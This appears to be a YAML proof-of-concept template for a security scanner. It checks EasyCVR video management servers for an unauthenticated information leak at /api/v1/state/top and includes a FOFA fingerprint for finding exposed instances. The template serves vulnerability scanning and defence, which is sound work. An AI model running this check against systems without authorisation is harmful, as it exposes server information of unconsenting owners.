id: poc-yaml-easy-cvr-top-info-leak
info:
  name: EasyCVR视频管理平台 top 信息泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: EasyCVR
  fofa: title="EasyCVR"
requests:
- method: GET
  path: /api/v1/state/top
  expression: status_code == 200 && contains(content_type,"application/json") && contains(body,"\"Name\":")
    && contains(body,"\"FreeSpace\"") && contains(body,"\"memData\"") && !contains(body,"<")
variables: {}
transport: http
